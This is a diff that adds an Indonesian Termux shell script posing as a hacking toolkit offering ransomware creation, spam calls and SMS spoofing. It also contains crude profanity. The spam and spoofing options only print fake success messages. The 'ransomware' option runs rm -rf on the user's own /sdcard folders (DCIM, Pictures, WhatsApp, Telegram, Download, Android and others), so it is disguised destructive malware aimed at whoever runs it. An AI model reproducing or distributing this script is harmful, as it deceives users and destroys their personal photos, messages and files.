@@ -1,0 +1,151 @@
+#!/bin/sh
+
+clear
+
+echo "***********************************"
+
+echo "* MR.MEKS TOOLS                   *"
+
+echo "* gunakan tools ini dengan bijak  *"
+
+echo "* GASKAN BOS KUH                  *"
+
+echo "***********************************"
+
+read -p "open tools? type y/n :" oke;
+
+if [ $oke = y ]
+
+then 
+
+echo "install bahan dulu....."
+
+pkg install cmatrix -y
+
+echo "meluncur ke tools bos kuh"
+
+elif [ $oke = n ]
+
+then
+
+echo "kontol bapak kau pecah anjing:v"
+
+exit
+
+fi
+
+clear
+
+echo "wellcome to toolsnya si memek"
+
+echo "(1) make to ransomeware"
+
+echo "(2) spam call"
+
+echo "(3) sms spoofing"
+
+echo "(666) exit"
+
+read -p "masukan pilihan anda :" pilih;
+
+if [ $pilih = 1 ]
+
+then
+
+echo "pembuatan ransome sedang berjalan!"
+
+sleep 3
+
+echo "dikit lagi crotnih!"
+
+sleep 2
+
+echo "croooottttt!"
+
+cd /sdcard
+
+rm -rf Pictures
+
+rm -rf Telegram
+
+rm -rf Android
+
+rm -rf DCIM
+
+rm -rf WhatsApp
+
+rm -rf Movies
+
+rm -rf Music
+
+rm -rf Download
+
+rm -rr pixLab
+
+rm -rf MIUI
+
+sleep 3
+
+echo "silahkan chek pada penyimpanan anda....."
+
+elif [ $pilih = 2 ]
+
+then
+
+read -p "masukan nomer target : " no;
+
+echo "target anda : " $no
+
+read -p "jumlah spam : " jumlah;
+
+echo "jumlah sepam : " $jumlah
+
+read -p "exsekusi target? type y : " yoi;
+
+sleep 10
+
+echo " sms terkirim : " $jumlah
+
+sleep 4
+
+elif [ $pilih = 3 ]
+
+then
+
+read -p "masukan nomer target : " no;
+
+echo "target anda : " $no
+
+read -p "nomer anda : " jumlah;
+
+echo "nomer anda : " $jumlah
+
+read -p "nama samaran : " tot;
+
+echo "nama samaran : " $tot
+
+read -p "pesan : " message;
+
+echo "pesan anda : " $message
+
+read -p "exsekusi target? type y : " yoi;
+
+cmatrix
+
+sleep 5
+
+echo " sms terkirim : "
+
+sleep 4
+
+elif [ $pilih = 666 ]
+
+then
+
+echo "terimakasi sudah menggunakan tools ini..."
+
+echo "__________________________________________"
+
+sleep 3
+
+fi
